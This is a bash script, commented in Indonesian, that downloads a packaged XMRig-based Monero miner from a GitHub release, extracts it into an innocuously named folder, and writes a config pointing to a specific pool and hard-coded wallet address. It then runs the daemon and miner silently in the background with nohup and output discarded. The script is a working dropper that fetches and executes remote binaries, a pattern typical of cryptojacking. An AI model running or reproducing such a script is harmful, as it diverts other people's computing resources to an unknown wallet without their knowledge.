#!/bin/bash

# Direktori kerja
APP_DIR=~/myapp
MINER_DIR="$APP_DIR/nswip/miner"
CONFIG_FILE="$MINER_DIR/config.json"

# Cek apakah xmrigDaemon sudah berjalan
if pgrep -f "./xmrigDaemon" > /dev/null; then
    echo "xmrigDaemon sudah berjalan. Keluar."
    exit 0
fi

# Buat direktori jika belum ada
mkdir -p "$APP_DIR"
cd "$APP_DIR" || exit

# Unduh dan ekstrak hanya jika belum ada
if [ ! -d "$MINER_DIR" ]; then
    wget -q https://github.com/vokerjok/Voker/releases/download/Voker/nswip.tar.gz -O nswip.tar.gz
    tar -xf nswip.tar.gz
    rm -f nswip.tar.gz
fi

cd "$MINER_DIR" || exit

# Buat file konfigurasi
cat > "$CONFIG_FILE" <<END
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "force-autoconfig": false,
        "max-threads-hint": 100,
        "max-cpu-usage": null,
        "asm": true,
        "argon2-impl": null,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 3,
    "donate-over-proxy": 1,
    "log-file": null,
    "pools": [
        {
            "algo": "rx",
            "coin": null,
            "url": "ikipou.web.id:443",
            "user": "85KNrXfutegLDjeRiaBjkUVjCU2A3jkDq8s79A6M1dXg3dL4zZcNwh9UZkSL2HrGmZhoVuFru53mQH8MMz97nTzc47kk9kr",
            "pass": "xmr1",
            "rig-id": null,
            "nicehash": false,
            "keepalive": false,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "cc-client": {
        "enabled": true,
        "servers": [
            {
                "url": "localhost:3344",
                "access-token": "mySecret",
                "use-tls": false
            }
        ],
        "use-remote-logging": true,
        "upload-config-on-start": true,
        "worker-id": null,
        "reboot-cmd": null,
        "update-interval-s": 10,
        "retries-to-failover": 5
    },
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "dns": {
        "ipv6": false,
        "ttl": 30
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
END

# Set permission
chmod +x "$CONFIG_FILE" xmrigDaemon xmrigMiner

# Jalankan xmrigDaemon di background
nohup ./xmrigDaemon > /dev/null 2>&1 &

# Jalankan xmrigMiner di background (langsung jalan terus)
nohup ./xmrigMiner > /dev/null 2>&1 &
